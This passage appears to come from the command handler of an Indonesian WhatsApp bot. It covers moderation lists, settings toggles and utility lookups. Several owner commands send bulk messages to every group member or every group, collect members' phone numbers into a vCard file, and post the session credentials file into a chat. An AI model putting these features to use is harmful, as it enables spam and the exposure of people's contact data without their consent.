					const isWhitelistt = whitelist.includes(users) ? true : false
					if (!isWhitelistt) return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Whitelist`, m)
					let anu = whitelist.indexOf(users)
					whitelist.splice(anu, 1)
					fs.writeFileSync('./database/whitelist.json', JSON.stringify(whitelist, null, 2))
					sock.sendTextWithMentions(m.chat, `Succes Unwhitelist @${users.split('@')[0]}`, m)
				} catch (err) {
					newReply(`Tag/Reply Target Yang Mau Di Un-whitelist`)
				}
			}
			break

			case 'listwl':
			case 'listwhitelist': {
				let txt = `------------ » *WHITELIST* « ------------\nTotal: *${whitelist.length}* Ditandai\n\n`
				for (let i of whitelist) {
					txt += `- @${i.split('@')[0]}\n`
				}
				sock.sendTextWithMentions(m.chat, txt, m)
			}
			break

			case 'bl':
			case 'blacklist':
			case 'tandai': {
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return newReply('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Tag/Reply Target Yang Mau Di ${command}`)
					const isBlacklistt = blacklist.includes(users) ? true : false
					if (isBlacklistt) return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Blacklist Sebelumnya`, m)
					blacklist.push(users)
					fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
					sock.sendTextWithMentions(m.chat, `Succes blacklist @${users.split('@')[0]}`, m)
				} catch (err) {
					newReply(`Tag/Reply Target Yang Mau Di blacklist`)
				}
			}
			break

			case 'unblack':
			case 'unblacklist': {
				if (!isCreator && !isAdmins) return newReply(mess.admin)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return newReply('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Tag/Reply Target Yang Mau Di ${command}`)
					const isBlacklistt = blacklist.includes(users) ? true : false
					if (!isBlacklistt) return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Tidak Ada Didaftar Blacklist`, m)
					let anu = blacklist.indexOf(users)
					blacklist.splice(anu, 1)
					fs.writeFileSync('./database/blacklist.json', JSON.stringify(blacklist, null, 2))
					sock.sendTextWithMentions(m.chat, `Succes Unblacklist @${users.split('@')[0]}`, m)
				} catch (err) {
					newReply(`Tag/Reply Target Yang Mau Di Un-blacklist`)
				}
			}
			break

			case 'listbl':
			case 'listblacklist': {
				let txt = `------------ » *BLACKLIST* « ------------\nTotal: *${blacklist.length}* Ditandai\n\n`
				for (let i of blacklist) {
					txt += `- @${i.split('@')[0]}\n`
				}
				sock.sendTextWithMentions(m.chat, txt, m)
			}
			break

			case 'listban':
			case 'listbanned': {
				let txt = `------------ » *BANNED* « ------------\nTotal: *${banned.length}* Di-banned\n\n`
				for (let i of banned) {
					txt += `*»:* @${i.split('@')[0]}\n`
				}
				sock.sendTextWithMentions(m.chat, txt, m)
			}
			break

			case 'ban':
			case 'banned': {
				if (!isCreator) return newReply(mess.owner)
				try {
					let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
					if (ownerNumber.includes(users)) return newReply('Tidak Dapat Melakukannya Kepada Owner')
					if (!m.mentionedJid[0] && !m.quoted && !text) return newReply(`Tag/Reply Target Yang Mau Di ${command}`)
					const iscBan = banned.includes(users)
					if (iscBan) return sock.sendTextWithMentions(m.chat, `@${users.split('@')[0]} Telah Di Banned Sebelumnya`, m)
					banned.push(users)
					fs.writeFileSync('./database/banned.json', JSON.stringify(banned, null, 2))
					sock.sendTextWithMentions(m.chat, `Succes banned @${users.split('@')[0]}`, m)
				} catch (err) {
					newReply(`Tag/Reply Target Yang Mau Di Banned`)
				}
			}
			break

			case 'delsession':
			case 'clearsession': {
				if (!isCreator) return newReply(mess.owner);
				fs.readdir("./session", async function(err, files) {
					if (err) {
						console.log('Gak bisa scan direktori: ' + err);
						return newReply('Gak bisa scan direktori nih: ' + err);
					}
					let filteredArray = files.filter(item => item !== "creds.json"); // Kecualikan creds.json
					console.log(filteredArray.length);
					let teks = `Ditemukan ${filteredArray.length} file sampah nih (kecuali creds.json)\n\n`;
					if (filteredArray.length == 0) return newReply(teks);
					filteredArray.forEach((file, i) => {
						teks += `${i + 1}. ${file}\n`;
					});
					newReply(teks);
					await sleep(1000);
					newReply("Mau hapus file sampahnya... Tunggu yaa...");
					filteredArray.forEach(file => {
						fs.unlinkSync(`./session/${file}`);
					});
					await sleep(1000);
					newReply("Berhasil hapus semua file sampah di folder session, kecuali creds.json! 🎉");
				});
			}
			break;

			case 'delmedia':
			case 'clearmedia': {
				if (!isCreator) return newReply(mess.owner);
				const folderPath = "temp"; // Direktori target (folder 'temp')
				const extensions = [
					".mp3", ".mp4", ".wav", ".flac", ".aac", ".ogg", ".m4a", ".m4r", ".wma", ".amr", 
					".jpg", ".jpeg", ".png", ".webp", ".gif", ".bmp", ".tiff", ".svg", ".ico", ".heic", 
					".mpg", ".mpeg", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".3gp", ".ts", ".webm", 
					".pdf", ".doc", ".docx", ".ppt", ".pptx", ".xls", ".xlsx", ".txt", ".rtf", ".odt", 
					".epub", ".html", ".htm", ".zip", ".rar", ".7z", ".tar", ".gz", ".iso", ".dmg", 
					".exe", ".apk", ".msi", ".bat", ".sh", ".py", ".js", ".css", ".json", ".xml", ".yml"
				];
				fs.readdir(`./${folderPath}`, async function (err, files) {
					if (err) {
						console.log('Gak bisa scan direktori: ' + err);
						return newReply('Gak bisa scan direktori nih: ' + err);
					}
					let filteredArray = files.filter((file) => {
						const ext = path.extname(file);
						return extensions.includes(ext); // Filter berdasarkan ekstensi
					});
					let teks = `Ditemukan ${filteredArray.length} file media di folder temp\n\n`;
					if (filteredArray.length === 0) return newReply(teks);
					filteredArray.forEach((file, i) => {
						teks += `${i + 1}. ${file}\n`;
					});
					newReply(teks);
					await sleep(1000);
					newReply("Mau hapus file medianya... Tunggu yaa...");
					filteredArray.forEach((file) => {
						const filePath = path.join(`./${folderPath}`, file);
						fs.unlinkSync(filePath); // Hapus file
					});
					await sleep(1000);
					newReply(`Berhasil hapus semua file media di folder *${folderPath}*! 🎉`);
				});
			}
			break;

			case 'joingroup':
			case 'joingrup':
			case 'joingc':
			case 'join': {
				try {
					if (!isCreator) return newReply(mess.owner);
					if (!text) return newReply('Masukkan Link Grup yaa!');
					if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply('Link-nya invalid nih!');
					let result = args[0].split('https://chat.whatsapp.com/')[1];
					sock.groupAcceptInvite(result);
					await newReply(`Sudah gabung ke grup! 🎉`);
				} catch {
					newReply('Gagal gabung ke grup, coba lagi nanti!');
				}
			}
			break;

			case 'outgroup':
			case 'outgrup':
			case 'outgc':
			case 'out':
				if (!isCreator) return newReply(mess.owner);
				if (!m.isGroup) return newReply(mess.group);
				newReply('Selamat tinggal, semuanya 🥺');
				await sock.groupLeave(m.chat);
			break;

			case 'groupinfo':
			case 'getgroupinfo':
			case 'getinfogc': {
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply(`Kirim perintah ${prefix + command} _linkgrup_`);
				if (!isUrl(args[0]) && !args[0].includes('chat.whatsapp.com')) return newReply(mess.error);
				try {
					let result = args[0].split('https://chat.whatsapp.com/')[1];
					let data = await sock.groupGetInviteInfo(result);
					let teks = `「 *GROUP METADATA* 」\n\n`;
					teks += `- *ID*: ${data.id}\n`;
					teks += `- *Name*: ${data.subject}\n`;
					teks += `- *Owner*: ${data.owner}\n`;
					teks += `- *Kirim Pesan*: ${data.announce ? 'Hanya Admin' : "Semua Orang"}\n`;
					teks += `- *Persetujuan Admin*: ${data.joinApprovalMode ? 'Yes' : "No"}\n`;
					teks += `- *Member Add Mode*: ${data.memberAddMode ? 'Yes' : "No"}\n`;
					teks += `- *Desk :*\n${data.desc}\n\n`;
					teks += `- *Anggota Teratas :*\n`;		
					for (let x of data.participants) {
						teks += `- @${x.id.split('@')[0]}\n`;
					}		
					let button = [{
						"name": "cta_copy",
						"buttonParamsJson": `{
							"display_text": "Copy Meta Group ID",
							"id": "${data.id}",
							"copy_code": "${data.id}"
						}`
					}];		
					sock.sendButtonText(m.chat, button, teks, footer, m)
				} catch (error) {
					newReply(mess.error);
				}
			}
			break;

			case 'getsession': {
				if (!isCreator) return newReply(mess.owner);
				newReply('Tunggu sebentar yaa, aku lagi ambil file session-mu nih');
				let sesi = fs.readFileSync(`./${sessionName}/creds.json`);
				sock.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/json',
					fileName: 'creds.json'
				}, {
					quoted: m
				});
			}
			break;

			case 'getdatabase': {
				if (!isCreator) return newReply(mess.owner);
				newReply('Tunggu sebentar yaa, aku lagi ambil file database-mu nih');
				let sesi = fs.readFileSync(`./src/${tempatDB}`);
				sock.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/json',
					fileName: `${tempatDB}`
				}, {
					quoted: m
				});
			}
			break;

			case 'getdbuser': {
				if (!isCreator) return newReply(mess.owner);
				newReply('Tunggu sebentar yaa, aku lagi ambil file database usermu nih');
				let sesi = fs.readFileSync('./src/data/role/user.json');
				sock.sendMessage(m.chat, {
					document: sesi,
					mimetype: 'application/json',
					fileName: 'user.json'
				}, {
					quoted: m
				});
			}
			break;

			case 'repo': case 'repository': {
				if (!text || !text.includes('/')) {
					return newReply(`Kamu bisa pakai format ini ya: *${prefix + command} username/repository*\n\n*Kirim perintah*: *${prefix + command} WhiskeySockets/Baileys*`);
				}
				const [username, repoName] = text.split('/');
				try {
					const data = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
					if (data.status === 200) {
						const repoData = data.data
						let formattedInfo = `📦 *Repository Name*: ${repoData.name}\n`;
						formattedInfo += `📝 *Description*: ${repoData.description}\n`;
						formattedInfo += `👤 *Owner*: ${repoData.owner.login}\n`;
						formattedInfo += `⭐ *Stars*: ${repoData.stargazers_count}\n`;
						formattedInfo += `🍴 *Forks*: ${repoData.forks_count}\n`;
						formattedInfo += `🔗 *URL*: ${repoData.html_url}\n\n`;
						formattedInfo += `🛠️ Pengen download ${command}? Ketik aja *${prefix}gitclone url* ya, kak! 🚀`;
						newReply(formattedInfo);
					} else {
						await newReply(`Tidak dapat mengambil informasi repositori.`)
					}
				} catch (error) {
					console.error(error)
					await newReply(`Repositori saat ini tidak tersedia.`)
				}
			}
			break;

			case 'myip':
			case 'ipbot':
				if (!isCreator) return newReply(mess.owner);
				let http = require('http');
				http.get({
					'host': 'api.ipify.org',
					'port': 80,
					'path': '/'
				}, function(resp) {
					resp.on('data', function(ip) {
						newReply("🔎 Oii, alamat IP publik aku nih: " + ip);
					})
				});
			break;

			case "ipwhois": {
				if (!text) return newReply(`Kirim perintah:\n\n${prefix + command} <IP Address>\n\n📌 Contoh:\n${prefix + command} 114.5.213.103`);
				const ip = text.trim();
				const apiUrl = `https://ipwho.is/${ip}`;
				try {
					newReply("🔍 Sedang mencari informasi, mohon tunggu...");
					const data = await fetchJson(apiUrl);
					if (data.success) {
						const flagEmoji = data.flag?.emoji || "🏳️";
						let message = "📍 *IP Whois Information*\n";
						message += `🌐 *IP Address*: ${data.ip}\n`;
						message += `🗺️ *Tipe*: ${data.type}\n`;
						message += `🌍 *Benua*: ${data.continent} (${data.continent_code})\n`;
						message += `🇨🇺 *Negara*: ${data.country} (${data.country_code}) ${flagEmoji}\n`;
						message += `🏙️ *Kota*: ${data.city}, ${data.region} (${data.region_code})\n`;
						message += `📞 *Kode Panggilan*: +${data.calling_code}\n`;
						message += `📫 *Kode Pos*: ${data.postal}\n`;
						message += `🏛️ *Ibu Kota*: ${data.capital}\n\n`;
						message += "📡 *Provider Informasi*\n";
						message += `🏢 *ISP*: ${data.connection?.isp || "Tidak tersedia"}\n`;
						message += `🔗 *Domain*: ${data.connection?.domain || "Tidak tersedia"}\n`;
						message += `🔢 *ASN*: ${data.connection?.asn || "Tidak tersedia"}\n\n`;
						message += "🕰️ *Zona Waktu*\n";
						message += `🕒 *ID*: ${data.timezone?.id || "Tidak tersedia"}\n`;
						message += `🕒 *UTC*: ${data.timezone?.utc || "Tidak tersedia"}\n`;
						message += `🕒 *Waktu Sekarang*: ${data.timezone?.current_time || "Tidak tersedia"}\n`;
						newReply(message);
					} else {
						newReply(`❌ IP Address tidak valid atau informasi tidak ditemukan.`);
					}
				} catch (err) {
					console.error(err);
					newReply("❌ Terjadi kesalahan saat mengambil data. Coba lagi nanti.");
				}
			}
			break;

			case 'request':
			case 'reportbug': {
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} hi dev, perintah ini gak jalan`);
				textt = `*| REQUEST/BUG |*`;
				teks1 = `\n\n*User*: @${m.sender.split("@")[0]}\n*Request/Bug*: ${text}`;
				teks2 = `\n\n*Hii ${pushname}, permintaan Kamu sudah dikirim ke pemilik aku, tunggu sebentar ya...*`;
				for (let i of owner) {
					sock.sendMessage(i + "@s.whatsapp.net", {
						text: textt + teks1,
						mentions: [m.sender],
					}, {
						quoted: m,
					});
				}
				sock.sendMessage(m.chat, {
					text: textt + teks2 + teks1,
					mentions: [m.sender],
				}, {
					quoted: m,
				});
			}
			break;


			case "restart": {
				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
				newReply("Bot sedang di-restart... ⏳");
				// Log untuk menandakan restart
				console.log("Bot restarting...");
				// Keluar dari proses bot, yang akan menyebabkan sistem (seperti PM2 atau lainnya) untuk restart otomatis
				process.exit();
				break;
			}

			case "kill": {
				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
				newReply("Bot sedang dimatikan secara paksa... ⚠️");
				// Log untuk menandakan kill
				console.log("Bot killed by owner!");
				// Keluar dari proses bot secara paksa
				process.exit(1); // Kode 1 menandakan proses dihentikan secara paksa
				break;
			}

			case "shutdown": {
				if (!isCreator) return newReply(mess.owner); // Cek apakah yang mengirim adalah creator
				newReply("Bot sedang dimatikan dan aplikasi akan shutdown... 💀");
				// Log untuk menandakan shutdown
				console.log("Bot shutting down...");
				// Menutup bot dan mematikan server atau aplikasi
				process.exit(0); // Kode 0 menandakan proses keluar dengan normal
				break;
			}

			case 'autoread':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].autoread = true;
					newReply(`Yay! Auto-read berhasil diubah ke ${q}`);
				} else if (q === 'false') {
					db.data.settings[botNumber].autoread = false;
					newReply(`Oke deh! Auto-read berhasil dimatikan, jadi gak bakal dibaca otomatis nih!`);
				}
			break;

			case 'unavailable':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].online = true;
					newReply(`Wah, sekarang bot aku lagi online, bisa nyapa-nyapa nih!`);
				} else if (q === 'false') {
					db.data.settings[botNumber].online = false;
					newReply(`Oke, bot aku jadi offline dulu ya, nanti nyapa-nyapanya kalau sudah aktif lagi 😎`);
				}
			break;

			case 'autorecordtype':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].autorecordtype = true;
					newReply(`Auto-record typing berhasil diubah ke ${q}!`);
				} else if (q === 'false') {
					db.data.settings[botNumber].autorecordtype = false;
					newReply(`Auto-record typing dimatikan, gak bakal ada rekaman ketik lagi ya!`);
				}
			break;

			case 'autorecord':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].autorecord = true;
					newReply(`Auto-record berhasil diubah ke ${q}, jadi semua aktivitas terrekam otomatis!`);
				} else if (q === 'false') {
					db.data.settings[botNumber].autorecord = false;
					newReply(`Auto-record dimatikan, gak bakal ada rekaman otomatis lagi!`);
				}
			break;

			case 'autotype':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].autotype = true;
					newReply(`Auto-typing berhasil diubah ke ${q}, jadi bot bakal ngetik otomatis deh!`);
				} else if (q === 'false') {
					db.data.settings[botNumber].autotype = false;
					newReply(`Auto-typing dimatikan, jadi bot gak bakal ngetik otomatis lagi!`);
				}
			break;

			case 'autobio':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].autobio = true;
					newReply(`Yay! AutoBio berhasil diubah ke ${q}, biografi otomatis aktif!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].autobio = false;
					newReply(`Oke, AutoBio berhasil dimatikan. Gak ada lagi bio otomatis nih!`);
				}
			break;

			case 'autosticker':
			case 'autostickergc':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].autosticker = true;
					newReply(`Sticker otomatis berhasil diubah ke ${q}, jadi semuanya bakal jadi sticker!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].autosticker = false;
					newReply(`Sticker otomatis dimatikan, gak ada sticker otomatis lagi deh!`);
				}
			break;

			case 'safesearch': {
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q === 'true') {
					db.data.settings[botNumber].safesearch = true;
					newReply(`🛡️ *SafeSearch Shield* berhasil diaktifkan!\nSekarang bot akan menjaga chat dari konten yang tidak pantas. 😊`);
				} else if (q === 'false') {
					db.data.settings[botNumber].safesearch = false;
					newReply(`🛡️ *SafeSearch Shield* berhasil dimatikan.\nFitur perlindungan konten Unavailable untuk saat ini.`);
				} else {
					newReply(`⚠️ Opsi tidak valid! Gunakan *on* untuk mengaktifkan atau *off* untuk mematikan.`);
				}
			}
			break;

			case 'autodownload':
			case 'autodl':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].autodownload = true;
					newReply(`Download otomatis berhasil diubah ke ${q}, jadi file bakal langsung terunduh otomatis!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].autodownload = false;
					newReply(`Download otomatis dimatikan, jadi file gak bakal langsung terunduh lagi!`);
				}
			break;

			case 'autoblock':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].autoblocknum = true;
					newReply(`Auto-Block berhasil diubah ke ${q}, jadi nomor yang mencurigakan bakal diblokir otomatis!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].autoblocknum = false;
					newReply(`Auto-Block dimatikan, jadi gak bakal ada pemblokiran otomatis lagi!`);
				}
			break;

			case 'onlygroup':
			case 'onlygc':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].onlygc = true;
					newReply(`Yeay! Onlygroup berhasil diubah ke ${q}, sekarang bot hanya bisa dipakai di grup aja!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].onlygc = false;
					newReply(`Oke, Onlygroup berhasil dimatikan, jadi bot bisa dipakai di mana saja deh!`);
				}
			break;

			case 'onlyprivatechat':
			case 'onlypc':
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`);
				if (q == 'true') {
					db.data.settings[botNumber].onlypc = true;
					newReply(`Yeay! Only-Pc berhasil diubah ke ${q}, sekarang bot hanya bisa dipakai di chat pribadi!`);
				} else if (q == 'false') {
					db.data.settings[botNumber].onlypc = false;
					newReply(`Oke, Only-Pc dimatikan, jadi bot bisa dipakai di grup juga deh!`);
				}
			break;

			case 'self':
				if (!isCreator) return newReply(mess.owner);
				sock.public = false;
				newReply(`Bot sekarang dalam mode *Self Usage* aja, gak bisa dipakai oleh orang lain ya!`);
			break;

			case 'public':
				if (!isCreator) return newReply(mess.owner);
				sock.public = true;
				newReply(`Bot sekarang kembali ke mode *Public Usage*, jadi bisa dipakai semua orang!`);
			break;

			case 'setexif':
			case 'setwm':
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
				global.packname = text.split("|")[0];
				global.author = text.split("|")[1];
				newReply(`Yeay! Exif berhasil diubah! 🎉\n\n · Packname: ${global.packname}\n · Author: ${global.author}`);
			break;

			case 'setprefix':
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
				global.prefa = text;
				newReply(`Prefix berhasil diubah menjadi ${text} ✨`);
			break;

			case 'setautoblock':
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
				global.autoblocknumber = text;
				newReply(`Auto-Block number berhasil diubah menjadi ${text} 🚫`);
			break;

			case 'setantiforeign':
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`*Kirim perintah*: ${prefix + command} packname|author`);
				global.antiforeignnumber = text;
				newReply(`Anti-foreign number berhasil diubah menjadi ${text} 🌍❌`);
			break;

			case 'pushkontak': {
				if (!isCreator) return newReply(mess.owner);
				if (!m.isGroup) return newReply(mess.private);
				let name = text.split('/')[0];
				let chet = text.split('/')[1];
				if (!name) return newReply(`*Kirim perintah*: ${prefix + command} nama/pesan`);
				if (!chet) return newReply(`*Kirim perintah*: ${prefix + command} nama/pesan`);
				let kontak = {
					displayName: "Contact",
					contacts: [{
						displayName: name,
						vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + name + ";;;\nFN:" + name + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
					}]
				}
				let push = await sock.groupMetadata(m.chat)
				if (push.participants.length > 300) return newReply('Batas member maksimal: *300*')
				await m.react('⏱️');
				for (let a of push.participants) {
					const repf = await sock.sendMessage(a.id, { contacts: kontak })
					sock.sendMessage(a.id, { text: chet }, { quoted: repf })
					await sleep(1000);
				}
				await newReply(mess.done);
			}
			break;

			case 'jpm': 
			case 'post': 
			case 'pushcontactgc': {
				if (!isCreator) return newReply(mess.owner);
				if (!m.isGroup) return newReply(mess.group);
				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n${prefix + command} teks|jeda\n\n📸 *Reply gambar* untuk mengirim ke semua grup.\n⏱️ *Jeda*: 1000 = 1 detik\n\n*Contoh*: ${prefix + command} Halo semuanya!|9000`);
				await newReply(`⏳ *Sedang diproses...*`);
				let getGroups = await sock.groupFetchAllParticipating();
				let groups = Object.entries(getGroups).map((entry) => entry[1]);
				let anu = groups.map((v) => v.id);
				for (let xnxx of anu) {
					let metadata = await sock.groupMetadata(xnxx);
					let participants = metadata.participants;
					if (/image/.test(mime)) {
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						let mem = await CatBox(media);
						await sock.sendMessage(xnxx, { 
							image: { url: mem }, 
							caption: text.split('|')[0], 
							mentions: participants.map(a => a.id) 
						});
						await sleep(text.split('|')[1]);
					} else {
						await sock.sendMessage(xnxx, { 
							text: text.split('|')[0], 
							mentions: participants.map(a => a.id) 
						});
						await sleep(text.split('|')[1]);
					}
				}
				newReply(`✅ *Berhasil mengirim pesan ke semua grup!* 🎯`);
			}
			break;

			case 'pushcontact': {
				if (!isCreator) return newReply(mess.owner);
				if (!m.isGroup) return newReply(mess.group);
				if (!text) return newReply(`⚠️ *Teksnya mana, kak?* 📛`);
				let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
				newReply(`⏳ *Sedang mengirim pesan ke semua kontak...*`);
				for (let pler of mem) {
					await sock.sendMessage(pler, { text: text });
				}
				newReply(`✅ *Pesan berhasil dikirim ke semua kontak!* 📲`);
			}
			break;

			case 'pushcontact2': {
				if (!isCreator) return newReply(mess.owner);
				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n${prefix + command} idgc|teks`);
				try {
					const metadata = await sock.groupMetadata(text.split("|")[0]);
					const participants = metadata.participants;
					for (let mem of participants) {
						await sock.sendMessage(
							`${mem.id.split('@')[0]}@s.whatsapp.net`, 
							{ text: text.split("|")[1] }
						);
						await sleep(5000);
					}
					newReply(`✅ *Pesan berhasil dikirim ke semua anggota grup!* 📨`);
				} catch {
					newReply(`⚠️ *Penggunaan yang benar:*\n${prefix + command} idgc|teks`);
				}
			}
			break;

			case 'pushcontact3': {
				if (!isCreator) return newReply(mess.owner);
				if (!m.isGroup) return newReply(mess.group);
				if (!text) return newReply(`⚙️ *Penggunaan yang benar:*\n\n${prefix + command} jeda|teks\n\n📸 *Reply gambar* untuk mengirim ke semua anggota.\n⏱️ *Jeda*: 1000 = 1 detik`);
				try {
					let jeda = text.split("|")[0];
					let caption = text.split("|")[1];
					let participants = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
					for (let men of participants) {
						if (/image/.test(mime)) {
							let media = await sock.downloadAndSaveMediaMessage(quoted);
							let mem = await CatBox(media);
							await sock.sendMessage(men, { 
								image: { url: mem }, 
								caption: caption 
							}, { quoted: m });
							await sleep(jeda);
						} else {
							await sock.sendMessage(men, { 
								text: caption 
							}, { quoted: m });
							await sleep(jeda);
						}
					}
					newReply(`✅ *Pesan berhasil dikirim ke semua anggota!* 📨`);
				} catch {
					newReply(`⚙️ *Penggunaan yang benar:*\n\n${prefix + command} jeda|teks\n\n📸 *Reply gambar* untuk mengirim ke semua anggota.\n⏱️ *Jeda*: 1000 = 1 detik`);
				}
			}
			break;

			case 'getcontact': case 'getcon': {
				if (!m.isGroup) return newReply(mess.group); // Hanya berlaku untuk grup
				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
				bigpp = await sock.sendMessage(m.chat, {
					text: `\nGrup: *${groupMetadata.subject}*\nAnggota: *${participants.length}*`
				}, {quoted: m, ephemeralExpiration: 86400});
				await sleep(1000);
				sock.sendContact(m.chat, participants.map(a => a.id), bigpp); // Kirim kontak anggota
			}
			break;

			case 'savecontact': case 'svcontact': {
				if (!m.isGroup) return newReply(mess.group); // Hanya untuk grup
				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
				let cmiggc = await sock.groupMetadata(m.chat);
				let orgiggc = participants.map(a => a.id);
				vcard = '';
				noPort = 0;
				for (let a of cmiggc.participants) {
					vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`; // Format VCARD untuk kontak
				}
				let nmfilect = './contacts.vcf';
				newReply('\nTunggu sebentar, menyimpan... ' + cmiggc.participants.length + ' kontak');
				require('fs').writeFileSync(nmfilect, vcard.trim());
				await sleep(2000);
				sock.sendMessage(m.chat, {
					document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: '\nSukses!\nGrup: *' + cmiggc.subject + '*\nKontak: *' + cmiggc.participants.length + '*'
				}, {ephemeralExpiration: 86400, quoted: m});
				require('fs').unlinkSync(nmfilect); // Hapus file setelah mengirim
			}
			break;

			case 'sendcontact': case 'sencontact': {
				if (!m.isGroup) return newReply(mess.group); // Hanya untuk grup
				if (!m.mentionedJid[0]) return newReply('\nGunakan seperti ini\n*Kirim perintah*: .sendcontact @tag name'); // Pastikan ada yang ditandai
				let snTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'; // Nama kontak
				let snContact = {
					displayName: "Contact", contacts: [{
						displayName: snTak, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${snTak};;;\nFN:${snTak}\nitem1.TEL;waid=${m.mentionedJid[0].split('@')[0]}:${m.mentionedJid[0].split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`
					}]
				};
				sock.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400});
			}
			break;

			case 'contacttag': case 'contag': {
				if (!m.isGroup) return newReply(mess.group); // Hanya untuk grup
				if (!(m.isAdmin || isCreator)) return newReply(mess.owner); // Hanya admin atau pemilik yang bisa
				if (!m.mentionedJid[0]) return newReply('\nGunakan seperti ini\n*Kirim perintah*: .contacttag @tag|name'); // Pastikan ada yang ditandai
				let sngTak = text.split(' ')[1] ? text.split(' ')[1] : 'Contact'; // Nama kontak
				let sngContact = {
					displayName: "Contact", contacts: [{
						displayName: sngTak, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;${sngTak};;;\nFN:${sngTak}\nitem1.TEL;waid=${m.mentionedJid[0].split('@')[0]}:${m.mentionedJid[0].split('@')[0]}\nitem1.X-ABLabel:Mobile\nEND:VCARD`
					}]
				};
				sock.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400});
			}
			break;

			case 'sendlocation': case 'sendloc': {
				let latitude = -6.175110;
